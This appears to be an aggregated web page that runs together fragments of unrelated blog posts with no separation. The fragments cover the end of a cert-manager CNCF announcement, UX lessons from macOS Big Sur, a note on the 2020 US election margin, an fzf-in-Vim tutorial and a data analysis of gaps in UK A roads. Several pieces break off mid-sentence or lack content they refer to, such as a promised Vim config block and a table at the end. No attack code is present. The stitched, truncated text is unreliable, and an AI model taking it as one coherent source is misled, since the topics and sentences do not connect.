<p>As part of the CNCF, we’re really looking forward to working with projects in the ecosystem
including continued collaboration with the Kubernetes project (e.g. Kubernetes CSR API), other projects such as <a href="https://openservicemesh.io/">OpenServiceMesh</a>, as well as new and additional efforts where we can be complementary (e.g. SPIFFE/Spire).</p>
<p>The project <a href="https://github.com/jetstack/cert-manager/blob/master/ROADMAP.md">roadmap</a> describes the major themes for the future, including supporting a broader set of use cases (including service mesh), support of upstream APIs, policy, extensbility through external issuers, PKI lifecycle management and more. If any features pique your interest, let us know what you think and feel free to join us and get involved!</p>
<h2 id="how-to-get-involved">How to get involved</h2>
<p>If you would like to be involved in the development of the project within the
CNCF then sign up for the <a href="https://groups.google.com/g/cert-manager-dev">mailing
list</a> which we use to send out
calendar invites. Once you have joined, you’ll receive invites to our bi-weekly
development meeting (held every other Wednesday at 5pm UK time).</p>
<p>The #cert-manager channel on the <a href="https://slack.k8s.io/">Kubernetes Slack</a> is

November 17, 2020 | https://learnuxd.io/posts/ux-lessons-from-big-sur | <a href="https://web.archive.org/web/*/https://learnuxd.io/posts/ux-lessons-from-big-sur">archive.org</a>

    <img src="https://learnuxd.io/img/posts/big-sur/cover.png" alt="UX Lessons from Big Sur">
</figure>

<p>The largest tech company in the world just launched new software.</p>

<p>There are problems with Apple’s Big Sur, but let’s look at a few UX decisions they (mostly) got right.</p>

<h2 id="user-first">User-first</h2>

<p>Emphasis on the UI was reduced in order to keep the focus on the user’s content. Buttons and controls appear when needed and recede when they’re not. Border and bezels have been softened or removed.</p>

<p><strong>The interface is there to serve the user<span>—</span>it shouldn’t draw attention to itself. Remove visual complexity &amp; increase the signal to noise ratio.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/user-first.png" alt="User-first">
</figure>

<h2 id="privacy--transparency">Privacy &amp; transparency</h2>

<p>Tracking prevention and transparency have been added to Safari. Inspired by food nutrition labels, new privacy information on the App Store lets you see a summary of the privacy practices of each app before you download it.</p>

<p><strong>Put privacy and transparency first. It’s in the best interest of your user.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/privacy-transparency.png" alt="Privacy and transparency">
</figure>

<h2 id="drill-down-on-key-workflows">Drill down on key workflows</h2>

<p>Apple clearly had a goal to improve the Messages app. There are now pinned conversations, better search, inline replies, mentions, and the ability to find GIFs. They know Messages are an important part of their platform.</p>

<p><strong>Invest time and effort in improving key tasks &amp; flows in your product. It’ll pay off in the end.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/key-tasks.png" alt="Drill down on key workflows">
</figure>

<h2 id="uniformity-across-services">Uniformity across services</h2>

<p>The Control Center and Notification Center changes are meant to create consistency through the ecosystem. There’s also new unified line of symbols. Some of the visual changes, though, like the new app icons, don’t match up with iOS 14; hopefully they’ll fix that.</p>

<p><strong>Maintain consistency and adhere to your own standards. It reduces cognitive load, makes the UI learnable, and gives a feeling of familiarity and confidence.</strong></p>

<figure>
    <img src="https://learnuxd.io/img/posts/big-sur/uniformity.png" alt="Uniformity across services">

<h2 id="system-status-visibility">System status visibility</h2>

<p>Multiple updates and standardizations were made to top-level UI’s, including the Control Center, widgets, Spotlight, and the Notification Center. These changes make system status clear, easy to find, and customizable.</p>

<p><strong>Quick access to general system controls and information makes an interface feel reliable and predictable, and builds trust.</strong></p>

<h2 id="stick-with-whats-familiar">Stick with what’s familiar</h2>

<p>When redesigning dock icons, Apple consciously tried to retain the personality from the original. There are lots of new UI sounds as well, which were literally built on top of snippets of the originals so that they sounded familiar.</p>

<p><strong>When doing a redesign, remember Familiarity Bias: people prefer familiar experiences. It’s best to build off what you have rather than make an entirely new experience.</strong></p>

<h2 id="clear-visual-feedback">Clear visual feedback</h2>

<p>The Dock and Menu Bar have a new interface that allows you to customize where controls show up. The method they use of visually showing the user exactly what will happen is not only satisfying, it’s a very effective form of communication.</p>

<p><strong>Clearly communicate the consequences of decisions, preferably visually.</strong></p>

<p>What do you think of Big Sur so far? What could they have done better?</p>

              <p>There seems to be a widely held opinion that this election was close.</p>
<p>I think it’s due to the fact that several states, like Georgia, Arizona, and Wisconsin, were indeed decided by less than 1% of votes cast. But when looking at the aggregate outcome, it’s hard to characterize the result as anything but historically decisive.</p>
<p>This article from The Nation notes that, despite Trump’s claim to have “WON THIS ELECTION, BY A LOT!", you’d have to go back <em>88 years</em> to find an incumbent loss by this margin - Biden won a higher precentage of the vote than any incumbent challenger since FDR defeated Herbert Hoover in 1932.</p>

The president may deny reality, but he cannot change the fact that he is now losing the popular vote and the Electoral College by momentous margins.

<p>If you never heard of <a href="https://github.com/junegunn/fzf">fzf</a>, it is a very
handy general-purpose command-line fuzzy finder. Besides command-line, it is
also a popular Vim plugin. If you’re wondering, a fuzzy finder is a tool that
helps you find what you’re looking for without needing to write the full name.</p>
<p>As a Vim user, I am always obsessed with doing a thing in the fewer keystrokes
as possible. Having the ability to open a file in Vim quickly is super useful to
me, and you will see why soon.</p>
<p>But, did you know that this fuzzy finder - fzf, can do a lot more than you
thought? Oh yeah, the fuzzy search is just the tip of the iceberg here.
It is like wine; the more you leave it on your computer, the more flavor and
sweetness it accumulates from that command-line. Let’s dive in and find out how
you can increase your productivity with fzf inside Vim.</p>
<h2 id="starting-off"><a href="#starting-off" aria-label="starting off permalink"></a>Starting off</h2>
<p>To be able to do the things I am doing in this blog post, you will need a couple of
plugins. If you’re not using <a href="https://github.com/junegunn/vim-plug">vim-plug</a>
for installing other Vim plugins, then you are missing out. Go ahead and set
that up, and you can add the following:</p>
<div data-language="vim"><pre><code>Plug <span>'junegunn/fzf'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>{</span> <span>-</span><span>&gt;</span> fzf#<span>install</span><span>(</span><span>)</span> <span>}</span> <span>}</span>
Plug <span>'junegunn/fzf.vim'</span></code></pre></div>
<p>Then, install these plugins with <code>:PlugInstall</code> or use this shortcut I use:</p>
<div data-language="vim"><pre><code>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>1</span> <span>:</span><span>source</span> ~<span>/</span><span>.</span>vimrc \| <span>:</span>PlugInstall<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>You can then press your leader key and number 1 to install and apply all the
changes in your <code>.vimrc</code>.</p>
<p>Now, to the coolest part!</p>
<h2 id="the-magic-finder"><a href="#the-magic-finder" aria-label="the magic finder permalink"></a>The magic finder</h2>
<p>Everything we need is installed, and we can get to the practical part. As we
said before, fzf is a fuzzy finder, a file selector if you want. Let’s try
out that feature right off. To get the file picker opened, type <code>:Files</code> in
a Vim session. You should get something like this:</p>
<p><span>
      <span></span>
  <img alt="Open :Files" title="Open :Files" src="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/fcda8/open-files.png" srcset="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/12f09/open-files.png 148w,

    </span></p>
<p>What happened is fzf opened a small window at the bottom showing files in our
directory. If you look at the newly opened window, you will see the list of
files, and the <strong>preview</strong> of the currently selected file on the right
of the window. So you got your files on the left and their preview on the
right. Are you already impressed as I was? Cool, let’s move on.</p>
<p>If you don’t like the window, you can fine-tune easily with fzf customization
options. But if you want any fzf command in fullscreen, you can append <code>!</code> at
the end of the command. For example, let’s do <code>:Files!</code> and you should see the
following:</p>
<p><span>
      <span></span>
  <img alt="Open :Files! in fullscreen" title="Open :Files! in fullscreen" src="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/fcda8/open-files-fullscreen.png" srcset="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/12f09/open-files-fullscreen.png 148w,

    </span></p>
<p>But, I don’t use <code>:Files</code> that often. As a matter of fact, I only use
<code>:GFiles</code> command by fzf. <code>:GFiles</code> will open a file picker for your Git files,
ignoring ones in the <code>.gitignore</code>. Using it is pretty neat in JavaScript
projects where <code>node_modules</code> files tend to kill the mood when running
<code>:Files</code>. Let us compare the same project with <code>:Files</code> and <code>:GFiles</code> commands:</p>
<p><span>

<p>
  Yuck! `node_modules` everywhere.
</p>
<p><span>
      <span></span>
  <img alt=":GFiles in a JavaScript project" title=":GFiles in a JavaScript project" src="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/fcda8/git-files-js-project.png" srcset="https://pragmaticpineapple.com/static/6cd545cf7ed03bb38decb5c1ae2d9949/12f09/git-files-js-project.png 148w,

    </span></p>
<p>
  Ah, that's better.
</p>
<p>Notice the difference? It feels like I just dropped a heavy backpack off my
back by not having those <code>node_modules/**</code> files popping up. Anyway, let’s see
this bad boy in action when searching for files to edit.</p>
<p><img src="https://pragmaticpineapple.com/5a84a887e91f3aea28f8692bcc518fc0/gfiles-in-action.gif" alt=":GFiles in action GIF"></p>
<p>That’s it, and it is looking pretty good. Only thing I dislike about using <code>:GFiles</code> is
that it won’t include your new files unless you add them to the Git index with
<code>git add</code>. Also, I’d like some syntax highlighting to be there out of the box
when previewing files, but we will cover that in another blog post. In the
meantime, consider subscribing to the <a href="https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/newsletter">newsletter</a> to get similar
posts like this.</p>
<p>To sum up, fzf is useful and quick as a flash when searching for files. And, as
Drake below says, resort to using <code>:GFiles</code> or try to configure <code>:Files</code> to
ignore certain files and paths.</p>
<p><span>
      <span></span>
  <img alt="Drake fzf choices - go with :GFiles instead of :Files" title="Drake fzf choices - go with :GFiles instead of :Files" src="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/41099/drake-no-files-yes-gfiles.jpg" srcset="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/a80bd/drake-no-files-yes-gfiles.jpg 148w,

    </span></p>
<p>To make this super fast for you, you can create a shortcut. I open <code>:GFiles</code>
with CTRL + p. I got left with this in my muscle memory from the legendary
<a href="https://github.com/kien/ctrlp.vim">ctrlp</a> plugin. To have <code>:GFiles</code> wired
up, so it opens with CTRL + p, you can add the following to your <code>.vimrc</code>:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span>C<span>-</span><span>p</span><span>&gt;</span> <span>:</span>GFiles<span>&lt;</span>Cr<span>&gt;</span></code></pre></div>
<h2 id="speed-search-your-project"><a href="#speed-search-your-project" aria-label="speed search your project permalink"></a>Speed search your project</h2>
<p>What blows my mind from time to time is other things you can do with fzf in
Vim. For example, you can use
<a href="https://github.com/ggreer/the_silver_searcher">The Silver Searcher</a>
or
<a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> with fzf.
To search with The Silver Searcher, type <code>:Ag</code> and a term you want to
search. And, to search with ripgrep, type <code>:Rg</code> and the term. Of course, to
have these commands work, you need the respective libraries installed in your
environment.</p>
<p>I use <code>:Ag</code>, and it performs wonderfully. It is wired to CTRL + g for me,
so I access it quickly. To have this or a similar setup, add the following
to your <code>.vimrc</code>:</p>

<p>The shortcut above will open up the <code>:Ag</code> search windows at the bottom with the
preview of the file. I find it super helpful and quick when I need to search
for a word in a project. Let’s see <code>:Ag</code> in action.</p>
<p><img src="https://pragmaticpineapple.com/0c1dc6a8efd411223955dd76a20783a6/ag-in-action.gif" alt=":Ag in action"></p>
<h2 id="buffed-up"><a href="#buffed-up" aria-label="buffed up permalink"></a>Buffed up</h2>
<p>You can search all your open buffers with fzf by typing <code>:Buffers</code>. I keep a
shortcut at my leader key (the Space key, BTW) + b. Like so:</p>
<div data-language="vim"><pre><code>nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>l</span> <span>:</span>Buffers<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>With that command, you will get a buffers explorer where you can quickly switch
between open files. I hope that helps. Let’s see how it looks:</p>
<p><span>
      <span></span>
  <img alt=":Buffers in action" title=":Buffers in action" src="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/fcda8/buffers.png" srcset="https://pragmaticpineapple.com/static/cb72ecbb277eb7bb278051d84c0b5f96/12f09/buffers.png 148w,

<p>If you are a fan of drawing inside the terminal, then you are going to love this one.
Try typing <code>:Commits</code> if you are using the <a href="https://github.com/tpope/vim-fugitive">vim-fugitive</a> plugin.
The plugin by itself is a pretty awesome wrapper around Git, just if you
never want to leave the warmth of your Vim session. Anyways, if you type
<code>:Commits</code> you should get a tree of your project commits like so:</p>

<p>Pretty cool, huh? You can scroll up and down and checkout changes at each
commit. You can even enter the commit you are interested in and check out
changes made there. All of this is possible thanks to the <code>vim-fugitive</code>, so check
it out. A blog post about using Git inside Vim is coming, so be sure to
subscribe to the <a href="https://pragmaticpineapple.com/newsletter">newsletter</a>.</p>
<h2 id="a-quick-summary"><a href="#a-quick-summary" aria-label="a quick summary permalink"></a>A quick summary</h2>
<p>Vim ecosystem has a lot of plugins, and fzf is one great plugin. You can search
for files with <code>:GFiles</code> and <code>:Files</code>. If you want to do a text search, try using
<code>:Ag</code> or <code>:Rg</code>, which use The Silver Searcher and ripgrep, respectively. Tired of
slow switching between open buffers - try out <code>:Buffers</code>. Or, if you want some
nice commit information, do <code>:Commits</code>.</p>

<p>I was driving recently, and realised that I was near a road that appeared to have a large gap.&nbsp; By that I mean: road A joins road B and stops, but some distance further along B there’s a bit more road A.&nbsp; It’s as if A has been chopped into two by B, and the two bits slid apart along B.&nbsp; I could think of another road like that, and wondered how many more there were in the UK.&nbsp; It turns out there’s quite a few.&nbsp; Time for some more data munging leading to some graphs and a map.</p>



<h2>Data</h2>



<p>The data I found was the <a href="https://www.ordnancesurvey.co.uk/business-government/products/open-map-roads">Ordnance Survey Open Roads</a>, which gives data for roads in Great Britain (sorry, no Northern Ireland data).&nbsp; It’s for motorways down to minor roads, in loads of detail.&nbsp; Each junction or time a road changes its name is called a node, and the data describes every node, and every bit of road between every node.&nbsp; The version I downloaded was the XML version, rather than a more exotic format such as an <a href="https://en.wikipedia.org/wiki/Shapefile">ESRI Shapefile</a> or <a href="https://www.geopackage.org/">GeoPackage</a>.&nbsp; This is 52 files (one for every major grid square on an OS map), and just under 7 GB in total.</p>



<p>Each node has a unique id, as does each bit of road (called a road link).&nbsp; Each node has its location and a few other bits of data.&nbsp; Each road link says which two nodes it goes between, whether its fictitious or not(!), what kind of road it is (A road, motorway etc.) and 1 or 2 names.&nbsp; A road link always has a road classification number, which might be A1307, and it might also have a name e.g. Huntingdon Road.</p>



<h2>Processing</h2>



<p>I decided to limit things to just A roads and motorways.&nbsp; Even so, there would be a lot of data, and roads such as the A1 will span many files.&nbsp; So the code needed to process each file only once, building up data in memory as it went.</p>



<p>Each time a road link was read in, it was checked against the data already read in.&nbsp; If the road was a new one, then the road was created with this road link as its only data.&nbsp; If the road was one for which there was already data, the new road link’s node ids (that described its two ends) were checked against the node ids already known for that road.&nbsp; If there were any matches for it, the new road link would be added to that data.&nbsp; If the new road link’s node ids weren’t already known, a new set of node ids was started for the road (so that there were two or more sets for the road).</p>



<p>It’s a bit like a game of dominoes – can a new road link be added to the end of an existing road link, because the numbers on the end match?&nbsp; If yes, the arrangement of dominoes is extended.&nbsp; If no, then an extra arrangement is started (with just one domino) alongside the existing dominoes for the road.&nbsp; It’s a little more complicated than that – there could be two existing separate sets of road links for a road (i.e. that don’t join up) and a new road link forms a bridge between the two sets.&nbsp; This means the two sets need to be merged into one.</p>



<p>At the end of processing, how many sets of road links are there per road?&nbsp; If there are two or more, then there are gaps in the road.</p>



<h2>Messy data, or the trouble with the Dundee ring road</h2>



<p>I ran into a problem that seems to happen with every data processing project I do, which is messy data.&nbsp; An example of this is the A991, which is a ring road around Dundee (I just happened to pick on it at random when debugging, as it was a small example of things being wrong).</p>



<p>To start off, I added some extra debug statements to my code, in the hope that this would show me what was going wrong.&nbsp; Unfortunately this didn’t help much, as it was like trying to understand The Matrix:</p>



<figure><img data-attachment-id="2618" data-permalink="https://randomtechthoughts.blog/debug-the-matrix/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png" data-orig-size="807,837" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="debug-the-matrix" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=289" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=807" alt="Raw debug info from my program" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png 807w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=145 145w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=289 289w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/debug-the-matrix.png?w=768 768w" sizes="(max-width: 807px) 100vw, 807px"></figure>



<p>I thought that the debug data might actually be helpful enough, just presented poorly.&nbsp; So with only a little bit of massaging I turned it into an input file for <a href="https://graphviz.org/">GraphViz</a>, so it could draw out what road link connected to what.&nbsp; This was a little bit more helpful:</p>



<figure><img data-attachment-id="2619" data-permalink="https://randomtechthoughts.blog/a991-graph/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png" data-orig-size="1237,751" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="a991-graph" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=1024" alt="Excerpt from the output of GraphViz for the debug info" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=1024 1024w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png?w=768 768w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/a991-graph.png 1237w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The A991 looks like this on a map (in this case, <a href="https://www.openstreetmap.org/">OpenStreetMap</a>) – it’s the pale orange road.</p>



<figure><img data-attachment-id="2620" data-permalink="https://randomtechthoughts.blog/open-streetmap-a991-big-picture/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png" data-orig-size="965,710" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-a991-big-picture" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=965" alt="A991 as shown on " srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png 965w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991-big-picture.png?w=768 768w" sizes="(max-width: 965px) 100vw, 965px"></figure>



<p>I could match the road names (West Marketgait etc.) between the graph and the map, and the junction near Dundee railway station at the bottom of the map was the problem.&nbsp; In the data, there is no joining up of the A991 there.&nbsp; On OpenStreetMap you can ask it for information about each bit of road, so you can see that South Union Street (highlighted in red/orange) is part of the A991:</p>



<figure><img data-attachment-id="2621" data-permalink="https://randomtechthoughts.blog/open-streetmap-a991/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png" data-orig-size="832,543" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-a991" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=832" alt="Excerpt of OpenStreetMap output showing the information about South Union Street, including the fact that it's part of the A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png 832w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-a991.png?w=768 768w" sizes="(max-width: 832px) 100vw, 832px"></figure>



<p>This way I could tell that OpenStreetMap also had a gap in the roads tagged as belonging to the A991, although its gap didn’t match up exactly with the gap in the OS data.&nbsp; The bit of the Riverside Esplanade highlighted in red / orange isn’t tagged with A991 (this is from OpenStreetMap), even though the OS data described it as part of the A991.</p>



<figure><img data-attachment-id="2623" data-permalink="https://randomtechthoughts.blog/open-streetmap-not-a991/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png" data-orig-size="995,627" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="open-streetmap-not-a991" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=995" alt="Excerpt from OpenStreetMap showing a gap in the A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png 995w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=300 300w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/open-streetmap-not-a991.png?w=768 768w" sizes="(max-width: 995px) 100vw, 995px"></figure>



<p>I checked the Ordnance Survey’s own online map to see if that would clear things up, and it didn’t.&nbsp; There’s less information and less helpful colouring than in OpenStreetMap:</p>



<figure><img data-attachment-id="2624" data-permalink="https://randomtechthoughts.blog/osmap/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png" data-orig-size="622,323" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="osmap" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=622" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=622" alt="Excerpt of OS online map for A991" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png 622w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/osmap.png?w=300 300w" sizes="(max-width: 622px) 100vw, 622px"></figure>



<p>Google Maps is different again!&nbsp; (I’ll let you imagine that / look it up for yourself.)</p>



<p>I decided to keep my life simple and just ignore any gaps less than a certain size.&nbsp; The threshold for ignoring gaps is arbitrary, and I wanted to err on the side of caution. &nbsp;That is I’d prefer to miss gaps that were there than treating noise in the data as a gap when it wasn’t one in real life.&nbsp; So I decided to go for a figure of 500m, as the location information was in metres (OS Eastings and Northings), and 500m is the biggest value that would round down to 0 if you round to the nearest kilometre.&nbsp; I know that’s still quite arbitrary, but I had to draw the line somewhere.</p>



<p>I also wanted to make sure that A roads becoming motorways didn’t introduce a gap, as in real life that’s the same road.&nbsp; For instance, the A1 becomes the A1(M) in places.&nbsp; If a road ended in “(M)” I ignored this, to avoid brief spells as a motorway introducing spurious gaps.</p>



<h2>To err is human</h2>



<p>I don’t always go into all the messy details, wrong turns etc. when I blog, because it would take too much time to write, and too much time to read (and so you’d probably lose interest).&nbsp; However, I’ve recently enjoyed watching videos by <a href="https://www.youtube.com/user/tomstanton282">Tom Stanton</a> and <a href="https://www.youtube.com/channel/UCj1VqrHhDte54oLgPG4xpuQ">Stuff Made Here</a>, and part of what makes them enjoyable is that you see the failure and frustration and disappointments, so that success seems properly earned.</p>



<p>It’s worth remembering that this is in the context of physical projects – planes flying or crashing, robots working or not etc. – which is a much more interesting kind of failure than someone writing about debugging software.&nbsp; I don’t want to give the false impression that everything goes swimmingly with this blog, but nor do I want to bore you.&nbsp; So, please imagine these posts are the tip of an iceberg, where the iceberg is mostly frustration and “Why isn’t it working?!”</p>



<h2>Calculating the size of gaps</h2>



<p>As I mentioned above, each road with gaps in had two or more separate sets of road links.&nbsp; I went for a brute force approach, and for a pair of sets A and B, calculate the distance between each node in set A and each node in B.&nbsp; I then took the minimum distance for the pair as the distance between sets A and B.&nbsp; If a road had more than two sets, then it wasn’t obvious which set was closest to which other set, so I extended the brute force approach to try each set with each other set, and say that the distance between a given set and the rest of the road was the minimum distance between that set and all other sets for the road.&nbsp; With all these distances calculated, I then took the biggest distance across all sets for a road to represent the road as a whole.</p>



<h2>Roads with different sizes of gaps</h2>



<p>This chart shows the number of roads that had a maximum gap of a given size, grouping gap sizes into ranges:</p>



<figure><img data-attachment-id="2626" data-permalink="https://randomtechthoughts.blog/gap-range-graph/" data-orig-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png" data-orig-size="682,485" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="gap-range-graph" data-image-description="" data-medium-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=300" data-large-file="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=656" src="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=682" alt="Chart showing how many roads have gaps of a certain size" srcset="https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png 682w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=150 150w, https://randomtechthoughtsblog.files.wordpress.com/2020/11/gap-range-graph.png?w=300 300w" sizes="(max-width: 682px) 100vw, 682px"></figure>



<p>Yes, there are roads that have gaps of over 300 km!  Most gaps are less than 10 km.</p>



<h2>How many sections per road</h2>



<p>I wanted to know how common it was for a road to be split into 2 or more sections (where I ignore gaps of less than 500m).  This table shows how common it is for a road to have a given number of sections.</p>



